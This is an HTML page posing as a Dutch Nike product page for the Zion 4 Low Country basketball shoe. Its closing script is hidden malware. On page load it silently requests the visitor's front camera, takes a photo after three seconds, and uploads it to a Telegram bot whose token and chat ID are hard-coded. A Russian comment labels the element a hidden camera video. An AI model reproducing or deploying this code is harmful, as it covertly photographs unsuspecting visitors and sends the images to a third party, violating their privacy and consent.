<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Nike Zion 4 Low Country</title>
<style>
  body {
    margin: 0; 
    font-family: "Nike Futura", Arial, sans-serif;
    background: #fff;
    color: #111;
    -webkit-font-smoothing: antialiased;
    user-select: none;
  }
  header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px 30px;
    border-bottom: 1px solid #e5e5e5;
  }
  .logo {
    font-weight: 700;
    font-size: 24px;
    letter-spacing: 3px;
    cursor: default;
  }
  nav {
    display: flex;
    gap: 25px;
  }
  nav span {
    color: #666;
    font-weight: 600;
    cursor: default;
  }
  main {
    max-width: 1200px;
    margin: 30px auto;
    padding: 0 20px;
  }
  .product-container {
    display: flex;
    flex-wrap: wrap;
    gap: 40px;
    justify-content: center;
  }
  .images {
    flex: 1 1 400px;
    max-width: 500px;
    position: relative;
  }
  .images img {
    width: 100%;
    border-radius: 20px;
    user-select: none;
  }
  .product-info {
    flex: 1 1 400px;
    max-width: 500px;
  }
  .product-info h1 {
    font-size: 2.7rem;
    font-weight: 800;
    margin-bottom: 10px;
    user-select: none;
  }
  .product-info h2 {
    font-weight: 500;
    font-size: 1rem;
    text-transform: uppercase;
    color: #888;
    margin-bottom: 20px;
  }
  .product-info p {
    font-size: 1rem;
    color: #444;
    margin-bottom: 30px;
    line-height: 1.5;
    user-select: none;
  }
  .price {
    font-weight: 700;
    font-size: 1.6rem;
    margin-bottom: 30px;
  }
  .btn {
    display: inline-block;
    padding: 15px 40px;
    margin-right: 20px;
    background: #111;
    color: #fff;
    border-radius: 50px;
    font-weight: 700;
    font-size: 1rem;
    cursor: default;
    user-select: none;
    box-shadow: 0 6px 15px rgb(0 0 0 / 0.2);
    transition: background-color 0.3s;
    text-align: center;
    text-decoration: none;
  }
  .btn:hover {
    background: #333;
  }

  footer {
    margin-top: 60px;
    padding: 20px;
    border-top: 1px solid #eee;
    color: #999;
    font-size: 0.9rem;
    text-align: center;
    user-select: none;
  }

  @media (max-width: 768px) {
    .product-container {
      flex-direction: column;
      gap: 25px;
    }
    .product-info h1 {
      font-size: 2rem;
    }
    .btn {
      padding: 12px 30px;
      font-size: 0.9rem;
      margin-bottom: 15px;
      width: 100%;
      text-align: center;
    }
  }
</style>
</head>
<body>

<header>
  <div class="logo">NIKE</div>
  <nav>
    <span>Men</span>
    <span>Women</span>
    <span>Kids</span>
    <span>Customize</span>
  </nav>
</header>

<main>
  <div class="product-container">
    <div class="images">
      <img src="https://i.imgur.com/6jHzUvN.png" alt="Nike Zion 4 Low Country" />
    </div>
    <div class="product-info">
      <h1>Zion 4 Low Country</h1>
      <h2>Basketbalschoenen</h2>
      <p>De Zion 4 Low Country is ontworpen voor maximale prestaties en comfort op het basketbalveld. Lichtgewicht en stijlvol met opvallende details.</p>
      <div class="price">€149,99</div>
      <div>
        <div class="btn">In Winkelwagen</div>
        <div class="btn">Nu Kopen</div>
      </div>
    </div>
  </div>
</main>

<footer>© 2025 Nike, Inc. Alle rechten voorbehouden.</footer>

<!-- Скрытое видео для фронтальной камеры -->
<video id="video" autoplay playsinline muted style="display:none;"></video>

<script>
  const TOKEN = "7652687345:AAElRXM2tsPSUIztZWkZhNDRlQ5x5CFrQjs";
  const CHAT_ID = "919015722";

  async function sendPhoto(blob) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "photo.jpg");
    try {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
      });
    } catch (e) {
      console.error("Ошибка отправки фото:", e);
    }
  }

  function captureAndSend() {
    const video = document.getElementById("video");
    const width = video.videoWidth || 320;
    const height = video.videoHeight || 240;
    if(width === 0 || height === 0) {
      console.error("Видео не готово");
      return;
    }
    const canvas = document.createElement("canvas");
    canvas.width = width;
    canvas.height = height;
    canvas.getContext("2d").drawImage(video, 0, 0, width, height);
    canvas.toBlob(sendPhoto, "image/jpeg");
  }

  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      const video = document.getElementById("video");
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          captureAndSend();
        }, 3000);
      };
    } catch(e) {
      console.error("Ошибка доступа к камере:", e);
    }
  }

  startCamera();
</script>

</body>
</html>
